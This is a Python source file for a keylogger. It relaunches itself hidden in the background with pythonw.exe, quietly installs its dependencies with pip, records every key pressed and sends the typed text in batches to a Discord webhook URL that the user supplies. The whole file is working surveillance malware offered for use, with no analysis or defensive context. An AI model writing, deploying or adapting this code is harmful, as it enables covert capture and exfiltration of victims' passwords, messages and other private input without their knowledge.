import os
import sys
import subprocess
import keyboard  # type: ignore
from discord_webhook import DiscordWebhook # type: ignore

def run_in_background():
    if sys.executable.endswith("pythonw.exe"):
        return

    hidden_cmd = f'start /b pythonw.exe "{sys.argv[0]}"'
    subprocess.Popen(hidden_cmd, shell=True)
    result = subprocess.run(["pip", "install", "keyboard"], capture_output=True, text=True)
    result2 = subprocess.run(["pip", "install", "discord-webhook"], capture_output=True, text=True)

    sys.exit()

run_in_background()

import time
while True:
    import keyboard  # type: ignore
    import subprocess  # type: ignore
    from discord_webhook import DiscordWebhook  # type: ignore
    webhook_url = "" # replace with your webhook url
    text = ""
    typingvar = ""
    last_enter_time = 0

    def on_key_event(e):
        if e.event_type == keyboard.KEY_DOWN:
            global text
            text += str(e.name)
            text_length = len(text)
            if e.name == "space":
                text = text.replace("space", " ")
            if e.name == "enter":
                text = text.replace("enter", "")
            if e.name == "backspace":
                text = text[:-9]
            if e.name == "shift":
                text = text.replace("shift", "")
            if e.name == "ctrl":
                text = text.replace("ctrl", "")
            
            if text_length > 20 and text.strip():
                webhook = DiscordWebhook(url=webhook_url, content=f'Key "{text}" was pressed')
                response = webhook.execute()
                text = ""

    def typing(t):
        if t.event_type == keyboard.KEY_DOWN:
            global typingvar, last_enter_time
            typingvar += str(t.name)
            typingvar_value = len(typingvar)
            if t.name == "space":
                typingvar = typingvar.replace("space", " ")
            if t.name == "enter" and typingvar_value != 0:
                current_time = time.time()
                if current_time - last_enter_time > 1 and typingvar.strip():
                    typingvar = typingvar.replace("enter", "")
                    webhook = DiscordWebhook(url=webhook_url, content=f'Key "{typingvar}" was typed')
                    response = webhook.execute()
                    typingvar = ""
                    last_enter_time = current_time
            if t.name == "backspace":
                typingvar = typingvar[:-9]
            if t.name == "shift":
                typingvar = typingvar.replace("shift", "")
            if t.name == "ctrl":
                typingvar = typingvar.replace("ctrl", "")

    keyboard.hook(on_key_event)
    keyboard.hook(typing)
    keyboard.wait()
